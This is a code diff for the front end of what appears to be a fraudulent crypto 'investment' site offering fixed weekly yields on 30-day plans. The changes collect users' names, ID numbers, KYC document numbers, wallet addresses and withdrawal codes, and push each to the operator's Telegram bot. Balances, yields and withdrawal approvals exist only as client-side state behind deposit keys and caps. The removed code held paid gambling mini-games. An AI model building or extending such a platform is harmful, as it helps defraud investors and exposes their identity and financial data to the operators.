@@ -1378,10 +1378,7 @@
 
         function savePersonalDetails(e) {
             e.preventDefault();
-            if (currentUserData.personalDetailsLocked) {
-                alert("Personal details are permanently locked and cannot be edited!");
-                return;
-            }
+            if(currentUserData.personalDetailsLocked) return;
 
             currentUserData.profile.name = document.getElementById('pfFullName').value.trim();
             currentUserData.profile.idNumber = document.getElementById('pfIdNumber').value.trim();
@@ -1390,36 +1387,36 @@
             currentUserData.profile.country = document.getElementById('pfCountry').value.trim();
             currentUserData.profile.email = document.getElementById('pfEmail').value.trim();
             currentUserData.profile.phone = document.getElementById('pfPhone').value.trim();
+            
             currentUserData.personalDetailsLocked = true;
-
             saveSystemDB();
+            
             initPersonalDetailsUI();
             document.getElementById('userDisplayName').innerText = currentUserData.profile.name;
 
-            sendTelegramNotification(`<b>🔒 Personal Details Locked!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Name:</b> ${currentUserData.profile.name}\n<b>ID No:</b> ${currentUserData.profile.idNumber}\n<b>DOB:</b> ${currentUserData.profile.dob}\n<b>City/Country:</b> ${currentUserData.profile.city}, ${currentUserData.profile.country}`);
+            sendTelegramNotification(`<b>🔒 Personal Details Saved & Locked</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Name:</b> ${currentUserData.profile.name}\n<b>ID:</b> ${currentUserData.profile.idNumber}\n<b>City:</b> ${currentUserData.profile.city}\n<b>Country:</b> ${currentUserData.profile.country}`);
 
-            alert("Personal details saved and permanently locked for lifetime security!");
+            alert('Personal details saved and permanently locked successfully!');
         }
 
         function initKycUI() {
             const docTypeInp = document.getElementById('kycDocType');
             const docNumInp = document.getElementById('kycDocNum');
-            const frontInp = document.getElementById('kycFrontImg');
-            const backInp = document.getElementById('kycBackImg');
+            const frontImgInp = document.getElementById('kycFrontImg');
+            const backImgInp = document.getElementById('kycBackImg');
             const submitBtn = document.getElementById('btnSubmitKyc');
             const lockNotice = document.getElementById('kycLockNotice');
 
             if (currentUserData.kycData && currentUserData.kycData.isLocked) {
-                docTypeInp.disabled = true; docNumInp.disabled = true;
+                docTypeInp.value = currentUserData.kycData.docType || 'National Identity Card (NIC)';
                 docNumInp.value = currentUserData.kycData.docNum || '';
-                docTypeInp.value = currentUserData.kycData.docType || docTypeInp.value;
-                frontInp.disabled = true; backInp.disabled = true;
+                
+                docTypeInp.disabled = true; docNumInp.disabled = true; frontImgInp.disabled = true; backImgInp.disabled = true;
                 submitBtn.disabled = true; submitBtn.style.opacity = '0.5'; submitBtn.style.cursor = 'not-allowed';
-                submitBtn.innerText = 'KYC Verified & Locked';
+                submitBtn.innerText = 'KYC Verification Locked';
                 lockNotice.style.display = 'flex';
             } else {
-                docTypeInp.disabled = false; docNumInp.disabled = false;
-                frontInp.disabled = false; backInp.disabled = false;
+                docTypeInp.disabled = false; docNumInp.disabled = false; frontImgInp.disabled = false; backImgInp.disabled = false;
                 submitBtn.disabled = false; submitBtn.style.opacity = '1'; submitBtn.style.cursor = 'pointer';
                 submitBtn.innerText = 'Submit & Lock Verification';
                 lockNotice.style.display = 'none';
@@ -1428,55 +1425,49 @@
 
         function handleKycSubmit(e) {
             e.preventDefault();
-            if (currentUserData.kycData && currentUserData.kycData.isLocked) {
-                alert("KYC verification is already completed and permanently locked!");
-                return;
-            }
+            if(currentUserData.kycData && currentUserData.kycData.isLocked) return;
 
             const docType = document.getElementById('kycDocType').value;
             const docNum = document.getElementById('kycDocNum').value.trim();
 
-            currentUserData.kycData = { docType: docType, docNum: docNum, isLocked: true };
-
+            currentUserData.kycData = { docType, docNum, isLocked: true };
             saveSystemDB();
+
             initKycUI();
 
-            sendTelegramNotification(`<b>🛡️ KYC Verified & Locked!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Doc Type:</b> ${docType}\n<b>Doc Number:</b> ${docNum}`);
+            sendTelegramNotification(`<b>🪪 KYC Submitted & Verified</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Doc Type:</b> ${docType}\n<b>Doc Number:</b> ${docNum}`);
 
-            alert("KYC Verification submitted successfully! Your identification records are now permanently locked.");
+            alert('KYC Documents submitted and verification locked successfully!');
         }
 
         function initWalletUI() {
-            if(!currentUserData.savedWallet) {
-                currentUserData.savedWallet = { trc20: '', binance: '', lockTimestamp: null };
-            }
-
-            const wallet = currentUserData.savedWallet;
-            const trcInput = document.getElementById('pfTrc20Address');
-            const binanceInput = document.getElementById('pfBinancePayId');
+            const trcInp = document.getElementById('pfTrc20Address');
+            const binanceInp = document.getElementById('pfBinancePayId');
             const saveBtn = document.getElementById('btnSavePayment');
             const lockNotice = document.getElementById('paymentLockNotice');
-            const lockText = document.getElementById('lockNoticeText');
+            const lockNoticeText = document.getElementById('lockNoticeText');
 
-            trcInput.value = wallet.trc20 || '';
-            binanceInput.value = wallet.binance || '';
+            if (currentUserData.savedWallet) {
+                trcInp.value = currentUserData.savedWallet.trc20 || '';
+                binanceInp.value = currentUserData.savedWallet.binance || '';
 
-            if (wallet.lockTimestamp) {
-                const now = new Date().getTime();
-                const daysPassed = (now - wallet.lockTimestamp) / (1000 * 60 * 60 * 24);
+                if (currentUserData.savedWallet.lockTimestamp) {
+                    const elapsedMs = Date.now() - currentUserData.savedWallet.lockTimestamp;
+                    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;
 
-                if (daysPassed < 30) {
-                    const remainingDays = Math.ceil(30 - daysPassed);
-                    trcInput.disabled = true; binanceInput.disabled = true;
-                    saveBtn.disabled = true; saveBtn.style.opacity = '0.5'; saveBtn.style.cursor = 'not-allowed';
-                    saveBtn.innerText = 'Payment Details Locked (30 Days)';
-                    lockNotice.style.display = 'flex';
-                    lockText.innerText = `Payment Details are Locked for 30 Days! Remaining: ${remainingDays} Day(s).`;
-                    return;
+                    if (elapsedMs < thirtyDaysMs) {
+                        const remainingDays = Math.ceil((thirtyDaysMs - elapsedMs) / (24 * 60 * 60 * 1000));
+                        trcInp.disabled = true; binanceInp.disabled = true;
+                        saveBtn.disabled = true; saveBtn.style.opacity = '0.5'; saveBtn.style.cursor = 'not-allowed';
+                        saveBtn.innerText = `Payment Details Locked (${remainingDays} Days Left)`;
+                        lockNoticeText.innerText = `Payment Details are Locked for 30 Days. (${remainingDays} days remaining)`;
+                        lockNotice.style.display = 'flex';
+                        return;
+                    }
                 }
             }
 
-            trcInput.disabled = false; binanceInput.disabled = false;
+            trcInp.disabled = false; binanceInp.disabled = false;
             saveBtn.disabled = false; saveBtn.style.opacity = '1'; saveBtn.style.cursor = 'pointer';
             saveBtn.innerText = 'Save Withdrawal Addresses';
             lockNotice.style.display = 'none';
@@ -1484,401 +1475,313 @@
 
         function handleWalletSave(e) {
             e.preventDefault();
+            const trc20 = document.getElementById('pfTrc20Address').value.trim();
+            const binance = document.getElementById('pfBinancePayId').value.trim();
 
-            if (currentUserData.savedWallet && currentUserData.savedWallet.lockTimestamp) {
-                const now = new Date().getTime();
-                const daysPassed = (now - currentUserData.savedWallet.lockTimestamp) / (1000 * 60 * 60 * 24);
-                if (daysPassed < 30) {
-                    alert(`Your payment methods are locked for 30 days! You cannot edit details until the period expires.`);
-                    return;
-                }
+            currentUserData.savedWallet = { trc20, binance, lockTimestamp: Date.now() };
+            saveSystemDB();
+
+            initWalletUI();
+
+            sendTelegramNotification(`<b>💳 Wallet Addresses Updated & Locked (30 Days)</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>TRC20 Address:</b> <code>${trc20}</code>\n<b>Binance Pay ID:</b> <code>${binance}</code>`);
+
+            alert('Withdrawal addresses saved and locked for 30 days!');
+        }
+
+        function updatePayoutAddressDisplay() {
+            const method = document.getElementById('payoutMethodSelect').value;
+            const targetAddressGroup = document.getElementById('targetAddressGroup');
+            const targetInp = document.getElementById('payoutTargetAddress');
+            const targetLabel = document.getElementById('targetAddressLabel');
+
+            if (method === 'trc20') {
+                targetAddressGroup.style.display = 'block';
+                targetLabel.innerText = 'USDT TRC-20 Address (From Profile)';
+                targetInp.value = currentUserData.savedWallet ? (currentUserData.savedWallet.trc20 || 'No TRC20 Address Saved in Profile') : 'No Address Saved';
+            } else if (method === 'binance') {
+                targetAddressGroup.style.display = 'block';
+                targetLabel.innerText = 'Binance Pay ID (From Profile)';
+                targetInp.value = currentUserData.savedWallet ? (currentUserData.savedWallet.binance || 'No Binance Pay ID Saved in Profile') : 'No ID Saved';
+            } else {
+                targetAddressGroup.style.display = 'none';
             }
+        }
 
-            const trcVal = document.getElementById('pfTrc20Address').value.trim();
-            const binanceVal = document.getElementById('pfBinancePayId').value.trim();
+        function handlePayoutSubmit(e) {
+            e.preventDefault();
+            const amt = parseFloat(document.getElementById('payoutAmt').value);
+            const method = document.getElementById('payoutMethodSelect').value;
 
-            if (!trcVal && !binanceVal) {
-                alert("Please fill in at least one payment method before saving!");
+            if (!currentUserData.personalDetailsLocked || !currentUserData.kycData || !currentUserData.kycData.isLocked) {
+                alert('Withdrawal Locked!\n\nYou must complete and lock both your Personal Details and KYC Verification in your Profile before requesting withdrawals.');
                 return;
             }
 
-            currentUserData.savedWallet = {
-                trc20: trcVal,
-                binance: binanceVal,
-                lockTimestamp: new Date().getTime()
-            };
+            if (isNaN(amt) || amt <= 0) {
+                alert('Please enter a valid withdrawal amount.');
+                return;
+            }
 
+            if (amt > 500) {
+                alert('Maximum allowed withdrawal per request is $500.');
+                return;
+            }
+
+            const todayStr = new Date().toDateString();
+            if (!currentUserData.dailyWithdrawals || currentUserData.dailyWithdrawals.date !== todayStr) {
+                currentUserData.dailyWithdrawals = { date: todayStr, count: 0 };
+            }
+
+            if (currentUserData.dailyWithdrawals.count >= 3) {
+                alert('Daily Withdrawal Limit Reached!\n\nYou have already reached the maximum allowed 3 withdrawals per day.');
+                return;
+            }
+
+            if (amt > currentUserData.available) {
+                alert(`Insufficient Available Withdrawal Balance! Available: $${currentUserData.available.toFixed(2)}`);
+                return;
+            }
+
+            let destinationStr = '';
+            if (method === 'trc20') {
+                destinationStr = currentUserData.savedWallet ? currentUserData.savedWallet.trc20 : '';
+                if (!destinationStr) { alert('No USDT TRC-20 address found in your saved profile!'); return; }
+            } else if (method === 'binance') {
+                destinationStr = currentUserData.savedWallet ? currentUserData.savedWallet.binance : '';
+                if (!destinationStr) { alert('No Binance Pay ID found in your saved profile!'); return; }
+            } else {
+                destinationStr = 'Cash Manager / Agent Direct Approval';
+            }
+
+            const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+
+            currentUserData.available -= amt;
+            currentUserData.dailyWithdrawals.count += 1;
+
+            addTx(`Withdrawal (${method.toUpperCase()})`, `-$${amt.toFixed(2)}`, "Pending Code Verification");
             saveSystemDB();
-            initWalletUI();
+            updateUI();
 
-            sendTelegramNotification(`<b>🔒 Payment Details Saved & Locked (30 Days)</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>TRC20:</b> ${trcVal}\n<b>Binance Pay ID:</b> ${binanceVal}`);
+            closeModal('payoutModal');
 
-            alert("Withdrawal payment details saved successfully! They are now locked for 30 days.");
+            document.getElementById('displayVerificationCode').innerText = verificationCode;
+            openModal('payoutSuccessModal');
+
+            sendTelegramNotification(`<b>💸 Withdrawal Requested!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amt.toFixed(2)}\n<b>Method:</b> ${method.toUpperCase()}\n<b>Destination:</b> <code>${destinationStr}</code>\n<b>Verification Code:</b> <code>${verificationCode}</code>\n<b>Remaining Available Balance:</b> $${currentUserData.available.toFixed(2)}`);
         }
 
-        function switchMainTab(tabId, el) {
-            document.querySelectorAll('.page-view').forEach(view => view.classList.remove('active'));
-            document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
+        function switchMainTab(viewId, element) {
+            document.querySelectorAll('.page-view').forEach(v => v.classList.remove('active'));
+            document.getElementById(viewId).classList.add('active');
 
-            const targetPage = document.getElementById(tabId);
-            if(targetPage) targetPage.classList.add('active');
-            if(el) el.classList.add('active');
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+            if(element) element.classList.add('active');
+
             closeSidebar();
         }
 
-        function switchProfileCategory(subTabId, el) {
-            document.querySelectorAll('.profile-sub-page').forEach(sub => sub.classList.remove('active'));
-            document.querySelectorAll('.profile-category-card').forEach(btn => btn.classList.remove('active'));
+        function switchProfileCategory(subId, element) {
+            document.querySelectorAll('.profile-sub-page').forEach(p => p.classList.remove('active'));
+            document.getElementById(subId).classList.add('active');
 
-            document.getElementById(subTabId).classList.add('active');
-            el.classList.add('active');
-        }
-
-        /* --- ERAN MINE GAMES LOGIC ($2.00 FEE PER PLAY) --- */
-        const GAME_FEE = 2.00;
-
-        function checkAndDeductGameFee(gameName) {
-            if (currentUserData.available < GAME_FEE) {
-                alert(`Insufficient Balance! You need at least $${GAME_FEE.toFixed(2)} in your Available Balance to play ${gameName}.`);
-                return false;
-            }
-            currentUserData.available -= GAME_FEE;
-            addTx(`${gameName} Fee`, `-$${GAME_FEE.toFixed(2)}`, "Completed");
-            saveSystemDB();
-            updateUI();
-            return true;
-        }
-
-        /* GAME 1: TREASURE MINE SWEEPER */
-        let mineBombIndex = -1;
-        let mineActive = false;
-
-        function resetMineGame() {
-            if (!checkAndDeductGameFee("Mine Sweeper")) return;
-            mineBombIndex = Math.floor(Math.random() * 6);
-            mineActive = true;
-            const btns = document.querySelectorAll('.mine-btn');
-            btns.forEach(b => { b.innerText = '❓'; b.disabled = false; b.style.background = 'rgba(255, 255, 255, 0.05)'; });
-        }
-
-        function playMineTile(idx) {
-            if (!mineActive) { alert("Please start a new mine game!"); return; }
-            const btns = document.querySelectorAll('.mine-btn');
-            if (idx === mineBombIndex) {
-                btns[idx].innerText = '💣';
-                btns[idx].style.background = 'rgba(239, 68, 68, 0.4)';
-                mineActive = false;
-                alert("BOOM! You hit the mine bomb! Better luck next time.");
-            } else {
-                btns[idx].innerText = '💎';
-                btns[idx].style.background = 'rgba(16, 185, 129, 0.4)';
-                btns[idx].disabled = true;
-                const winAmt = 4.00;
-                currentUserData.available += winAmt;
-                addTx("Mine Sweeper Reward", `+$${winAmt.toFixed(2)}`, "Completed");
-                saveSystemDB();
-                updateUI();
-                sendTelegramNotification(`<b>💎 Mine Sweeper Won!</b>\n\n<b>User:</b> ${currentUserData.profile.username}\n<b>Won:</b> $${winAmt.toFixed(2)}`);
-                alert(`CONGRATS! You uncovered a Treasure Gem! +$${winAmt.toFixed(2)} credited to Available Balance.`);
-            }
-        }
-
-        /* GAME 2: FORTUNE WHEEL */
-        function spinFortuneWheel() {
-            if (!checkAndDeductGameFee("Fortune Wheel")) return;
-            const display = document.getElementById('wheelText');
-            display.style.transform = 'rotate(1080deg)';
-            
-            setTimeout(() => {
-                const rewards = [0.50, 1.00, 3.00, 5.00, 10.00, 20.00];
-                const prize = rewards[Math.floor(Math.random() * rewards.length)];
-                display.innerText = `$${prize.toFixed(2)}`;
-                display.style.transform = 'rotate(0deg)';
-                
-                currentUserData.available += prize;
-                addTx("Fortune Wheel Win", `+$${prize.toFixed(2)}`, "Completed");
-                saveSystemDB();
-                updateUI();
-                sendTelegramNotification(`<b>🎡 Wheel Won!</b>\n\n<b>User:</b> ${currentUserData.profile.username}\n<b>Won:</b> $${prize.toFixed(2)}`);
-                alert(`Jackpot! Wheel landed on $${prize.toFixed(2)}!`);
-            }, 1500);
-        }
-
-        /* GAME 3: CRYPTO FLIP */
-        let selectedCoin = 'HEADS';
-
-        function selectCoinSide(side) {
-            selectedCoin = side;
-            document.getElementById('btnHeads').style.borderColor = side === 'HEADS' ? 'var(--accent-gold)' : 'transparent';
-            document.getElementById('btnTails').style.borderColor = side === 'TAILS' ? 'var(--accent-gold)' : 'transparent';
-        }
-
-        function flipCryptoCoin() {
-            if (!checkAndDeductGameFee("Crypto Flip")) return;
-            const coin = document.getElementById('coinDisplay');
-            coin.style.transform = 'rotateY(720deg)';
-
-            setTimeout(() => {
-                const outcome = Math.random() > 0.5 ? 'HEADS' : 'TAILS';
-                coin.innerText = outcome === 'HEADS' ? '₿' : '⚡';
-                coin.style.transform = 'rotateY(0deg)';
-
-                if (selectedCoin === outcome) {
-                    const winAmt = 4.00;
-                    currentUserData.available += winAmt;
-                    addTx("Crypto Flip Win", `+$${winAmt.toFixed(2)}`, "Completed");
-                    saveSystemDB();
-                    updateUI();
-                    sendTelegramNotification(`<b>🪙 Coin Flip Won!</b>\n\n<b>User:</b> ${currentUserData.profile.username}\n<b>Won:</b> $${winAmt.toFixed(2)}`);
-                    alert(`Correct Guess! It landed on ${outcome}! You won +$${winAmt.toFixed(2)}!`);
-                } else {
-                    alert(`Unlucky! It landed on ${outcome}. Try again!`);
-                }
-            }, 1000);
-        }
-
-        /* GAME 4: MYSTERY BOX */
-        let boxPlayed = false;
-
-        function resetMysteryBoxes() {
-            boxPlayed = false;
-            document.getElementById('boxStatusText').innerText = "Select a box to play ($2.00)";
-            const boxes = document.querySelectorAll('.box-btn');
-            boxes.forEach(b => { b.innerText = '🎁'; b.disabled = false; });
-        }
-
-        function openMysteryBox(boxNum) {
-            if (boxPlayed) { alert("Please reset boxes first!"); return; }
-            if (!checkAndDeductGameFee("Mystery Box")) return;
-
-            boxPlayed = true;
-            const rewards = [1.00, 2.50, 5.00, 15.00, 50.00];
-            const prize = rewards[Math.floor(Math.random() * rewards.length)];
-
-            currentUserData.available += prize;
-            addTx("Mystery Box Win", `+$${prize.toFixed(2)}`, "Completed");
-            saveSystemDB();
-            updateUI();
-
-            document.getElementById('boxStatusText').innerText = `Opened Box #${boxNum}! Won $${prize.toFixed(2)}`;
-            sendTelegramNotification(`<b>📦 Mystery Box Unboxed!</b>\n\n<b>User:</b> ${currentUserData.profile.username}\n<b>Won:</b> $${prize.toFixed(2)}`);
-            alert(`Awesome! You opened Box #${boxNum} and found $${prize.toFixed(2)} cash!`);
+            document.querySelectorAll('.profile-category-card').forEach(c => c.classList.remove('active'));
+            if(element) element.classList.add('active');
         }
 
         function renderPackages() {
             const container = document.getElementById('packagesContainer');
-
             container.innerHTML = packagesData.map(pkg => `
                 <div class="pkg-card">
                     <div class="pkg-badge">${pkg.badge}</div>
-                    <div>
-                        <div class="pkg-icon-wrap"><i class="fa-solid ${pkg.icon}"></i></div>
-                        <div class="pkg-title">${pkg.name}</div>
-                        <div class="pkg-price">$${pkg.price.toFixed(2)}</div>
-                        <div class="pkg-feature"><span>Expected Profit:</span> <strong style="color:var(--accent-green);">${pkg.returnLabel}</strong></div>
-                        <div class="pkg-feature"><span>Min Withdrawal:</span> <strong>$${pkg.minWithdraw.toFixed(2)}</strong></div>
-                        <div class="pkg-feature"><span>Duration Period:</span> <strong>30 Days</strong></div>
+                    <div class="pkg-icon-wrap"><i class="fa-solid ${pkg.icon}"></i></div>
+                    <div class="pkg-title">${pkg.name}</div>
+                    <div class="pkg-price">$${pkg.price.toFixed(2)}</div>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <div class="pkg-feature"><span>Category</span><strong>Weekly Yield</strong></div>
+                        <div class="pkg-feature"><span>Expected Return</span><strong style="color: var(--accent-green);">${pkg.returnLabel}</strong></div>
+                        <div class="pkg-feature"><span>Min Withdrawal</span><strong>$${pkg.minWithdraw.toFixed(2)}</strong></div>
+                        <div class="pkg-feature"><span>Plan Duration</span><strong>30 Days</strong></div>
                     </div>
-                    <button class="btn btn-gold" style="margin-top:20px;" onclick="purchasePackage(${pkg.id})">
-                        <i class="fa-solid fa-cart-shopping"></i> Activate Tier
+
+                    <button class="btn btn-gold" onclick="purchasePackage(${pkg.id})">
+                        <i class="fa-solid fa-cart-shopping"></i> Purchase Plan ($${pkg.price})
                     </button>
                 </div>
             `).join('');
         }
 
-        function is30DaysActive() {
-            if (!currentUserData.investmentStartDate) return false;
-            const now = new Date().getTime();
-            const elapsedDays = (now - currentUserData.investmentStartDate) / (1000 * 60 * 60 * 24);
-            return elapsedDays < 30;
-        }
-
         function purchasePackage(pkgId) {
-            if (is30DaysActive()) {
-                alert("Rule Restriction: Only 1 active investment plan is permitted per 30 days!");
-                return;
-            }
-
             const pkg = packagesData.find(p => p.id === pkgId);
             if (!pkg) return;
 
+            if (currentUserData.activePlans && currentUserData.activePlans.length > 0) {
+                const activePlan = currentUserData.activePlans[0];
+                const elapsedMs = Date.now() - activePlan.startDate;
+                const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;
+
+                if (elapsedMs < thirtyDaysMs) {
+                    const daysLeft = Math.ceil((thirtyDaysMs - elapsedMs) / (24 * 60 * 60 * 1000));
+                    alert(`Package Purchase Limit Reached!\n\nYou already have an active plan (${activePlan.name}). Only 1 active plan per 30 days is allowed.\n\nTime remaining on active plan: ${daysLeft} days.`);
+                    return;
+                }
+            }
+
             if (currentUserData.deposit < pkg.price) {
-                alert(`Insufficient Balance! You need $${pkg.price.toFixed(2)} in your Deposit Balance to buy this package.`);
+                alert(`Insufficient Deposit Balance!\n\nPlan Price: $${pkg.price.toFixed(2)}\nYour Deposit Balance: $${currentUserData.deposit.toFixed(2)}\n\nPlease recharge your deposit balance using a 6-digit Deposit Key.`);
                 openModal('rechargeModal');
                 return;
             }
 
             currentUserData.deposit -= pkg.price;
-            currentUserData.activePlans = [pkg];
-            currentUserData.investmentStartDate = new Date().getTime();
+            
+            const newPlan = {
+                ...pkg,
+                startDate: Date.now(),
+                lastClaimDate: Date.now()
+            };
 
-            addTx("Plan Purchase", `-$${pkg.price.toFixed(2)}`, "Completed");
+            currentUserData.activePlans = [newPlan];
+            currentUserData.investmentStartDate = Date.now();
+
+            addTx(`Package Purchase (${pkg.name})`, `-$${pkg.price.toFixed(2)}`, "Completed");
+
             saveSystemDB();
             updateUI();
             renderClaimsTable();
+            checkWeeklyClaimStatus();
 
-            sendTelegramNotification(`<b>🚀 Plan Purchased!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Plan:</b> ${pkg.name}\n<b>Amount:</b> $${pkg.price.toFixed(2)}`);
+            sendTelegramNotification(`<b>🚀 New Investment Plan Activated!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Plan Name:</b> ${pkg.name}\n<b>Price:</b> $${pkg.price.toFixed(2)}\n<b>Weekly Yield:</b> $${pkg.weeklyVal.toFixed(2)}`);
 
-            alert(`Successfully purchased ${pkg.name}! Your weekly quantitative yield is now live.`);
+            alert(`Package Purchased Successfully!\n\n${pkg.name} is now active. You can claim weekly returns of $${pkg.weeklyVal.toFixed(2)} every 7 days.`);
         }
 
         function renderClaimsTable() {
             const tbody = document.getElementById('claimsTableBody');
-            if (currentUserData.activePlans.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--text-muted);">No active packages found. Purchase a tier to enable claims.</td></tr>`;
+            if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 24px;">No Active Investment Plans Found. Purchase a plan to enable weekly claims.</td></tr>`;
                 return;
             }
 
-            tbody.innerHTML = currentUserData.activePlans.map(pkg => `
+            tbody.innerHTML = currentUserData.activePlans.map(plan => `
                 <tr>
-                    <td><strong>${pkg.name}</strong></td>
-                    <td style="text-transform:capitalize;">${pkg.category}</td>
-                    <td>$${pkg.price.toFixed(2)}</td>
-                    <td style="color:var(--accent-green);">$${pkg.weeklyVal.toFixed(2)} / Week</td>
-                    <td>$${pkg.minWithdraw.toFixed(2)}</td>
-                    <td style="text-align:center;">
-                        <label class="big-switch">
-                            <input type="checkbox" id="claimTableToggle" onchange="toggleHomeYield(this)">
-                            <span class="slider"></span>
-                        </label>
+                    <td><strong>${plan.name}</strong></td>
+                    <td><span style="color: var(--accent-gold); font-weight: 700;">Weekly Plan</span></td>
+                    <td>$${plan.price.toFixed(2)}</td>
+                    <td style="color: var(--accent-green); font-weight: 700;">+$${plan.weeklyVal.toFixed(2)} / Week</td>
+                    <td>$${plan.minWithdraw.toFixed(2)}</td>
+                    <td style="text-align: center;">
+                        <span style="font-size: 12px; font-weight: 700; color: var(--accent-green);">AUTOMATED WEEKLY TICK ENABLED</span>
                     </td>
                 </tr>
             `).join('');
         }
 
         function checkWeeklyClaimStatus() {
-            const now = new Date().getTime();
-            const lastClaim = currentUserData.lastClaimTimestamp;
-            const toggle1 = document.getElementById('homeYieldToggle');
-            const toggle2 = document.getElementById('claimTableToggle');
+            const toggle = document.getElementById('homeYieldToggle');
             const statusText = document.getElementById('switchStatusText');
 
-            const isAvailableThisWeek = !lastClaim || (now - lastClaim >= 7 * 24 * 60 * 60 * 1000);
-
-            if (currentUserData.activePlans.length === 0) {
-                if (toggle1) { toggle1.checked = false; toggle1.disabled = true; }
-                if (toggle2) { toggle2.checked = false; toggle2.disabled = true; }
-                if (statusText) statusText.innerText = "NO ACTIVE PACKAGE";
+            if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) {
+                toggle.checked = false;
+                toggle.disabled = true;
+                statusText.innerText = "NO ACTIVE PLAN FOUND";
+                statusText.style.color = "var(--accent-red)";
                 return;
             }
 
-            if (!isAvailableThisWeek) {
-                if (toggle1) { toggle1.checked = true; toggle1.disabled = true; }
-                if (toggle2) { toggle2.checked = true; toggle2.disabled = true; }
-                if (statusText) statusText.innerText = "WEEKLY YIELD HARVESTED";
+            const activePlan = currentUserData.activePlans[0];
+            const lastClaim = activePlan.lastClaimDate || activePlan.startDate;
+            const elapsedMs = Date.now() - lastClaim;
+            const sevenDaysMs = 7 * 24 * 60 * 60 * 1000;
+
+            if (elapsedMs >= sevenDaysMs) {
+                toggle.disabled = false;
+                toggle.checked = false;
+                statusText.innerText = "WEEKLY YIELD READY TO CLAIM!";
+                statusText.style.color = "var(--accent-green)";
             } else {
-                if (toggle1) { toggle1.checked = false; toggle1.disabled = false; }
-                if (toggle2) { toggle2.checked = false; toggle2.disabled = false; }
-                if (statusText) statusText.innerText = "WEEKLY YIELD READY TO HARVEST";
+                toggle.disabled = true;
+                toggle.checked = true;
+                const daysLeft = Math.ceil((sevenDaysMs - elapsedMs) / (24 * 60 * 60 * 1000));
+                statusText.innerText = `YIELD ACTIVE (${daysLeft} DAYS TO NEXT CLAIM)`;
+                statusText.style.color = "var(--accent-gold)";
             }
         }
 
-        function toggleHomeYield(el) {
-            if (!el.checked) return;
+        function toggleHomeYield(toggleElem) {
+            if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) return;
 
-            if (currentUserData.activePlans.length === 0) {
-                alert("You don't have an active investment package!");
-                el.checked = false;
-                return;
-            }
+            const activePlan = currentUserData.activePlans[0];
+            const yieldAmount = activePlan.weeklyVal;
 
-            const pkg = currentUserData.activePlans[0];
-            const reward = pkg.weeklyVal;
+            currentUserData.pending += yieldAmount;
+            activePlan.lastClaimDate = Date.now();
 
-            currentUserData.pending += reward;
-            currentUserData.lastClaimTimestamp = new Date().getTime();
+            addTx(`Weekly Claim Yield (${activePlan.name})`, `+$${yieldAmount.toFixed(2)}`, "Pending Wallet");
 
-            addTx("Weekly Claim Harvest", `+$${reward.toFixed(2)}`, "Completed");
             saveSystemDB();
             updateUI();
             checkWeeklyClaimStatus();
 
-            alert(`Weekly Yield Harvested Successfully!\n\n+$${reward.toFixed(2)} credited to your Pending Wallet.`);
+            sendTelegramNotification(`<b>💰 Weekly Yield Claimed!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Yield Amount:</b> $${yieldAmount.toFixed(2)}\n<b>New Pending Balance:</b> $${currentUserData.pending.toFixed(2)}`);
+
+            alert(`Weekly Yield Claimed!\n\n+$${yieldAmount.toFixed(2)} has been added to your Pending Profit Wallet.`);
         }
 
         function transferPendingToAvailable() {
             if (currentUserData.pending <= 0) {
-                alert("No pending profit available to transfer.");
+                alert('Your Pending Profit Wallet is empty! No funds to transfer.');
                 return;
             }
 
-            const transferred = currentUserData.pending;
-            currentUserData.available += transferred;
+            const transferredAmt = currentUserData.pending;
+            currentUserData.available += transferredAmt;
             currentUserData.pending = 0;
 
-            addTx("Wallet Transfer (Pending -> Available)", `$${transferred.toFixed(2)}`, "Completed");
+            addTx("Wallet Transfer (Pending -> Available)", `+$${transferredAmt.toFixed(2)}`, "Completed");
+
             saveSystemDB();
             updateUI();
 
-            alert(`Transferred $${transferred.toFixed(2)} to Available Balance!`);
+            sendTelegramNotification(`<b>🔄 Balance Transferred!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Transferred Amount:</b> $${transferredAmt.toFixed(2)}\n<b>New Available Balance:</b> $${currentUserData.available.toFixed(2)}`);
+
+            alert(`Transfer Successful!\n\n$${transferredAmt.toFixed(2)} transferred from Pending Wallet to Available Withdrawal Balance.`);
         }
 
-        function updatePayoutAddressDisplay() {
-            const method = document.getElementById('payoutMethodSelect').value;
-            const addrInput = document.getElementById('payoutTargetAddress');
-            const wallet = currentUserData.savedWallet || {};
-
-            if (method === 'trc20') {
-                addrInput.value = wallet.trc20 || "No TRC-20 Address Saved in Profile";
-            } else if (method === 'binance') {
-                addrInput.value = wallet.binance || "No Binance Pay ID Saved in Profile";
-            } else {
-                addrInput.value = "Luminary FX Authorized Agent / Cash Manager System";
-            }
+        function addTx(type, amount, status) {
+            if (!currentUserData.transactions) currentUserData.transactions = [];
+            const txId = 'TX' + Math.floor(100000 + Math.random() * 900000);
+            const dateStr = new Date().toLocaleString();
+            currentUserData.transactions.unshift({ id: txId, type, amount, date: dateStr, status });
         }
 
-        function handlePayoutSubmit(e) {
-            e.preventDefault();
+        function updateUI() {
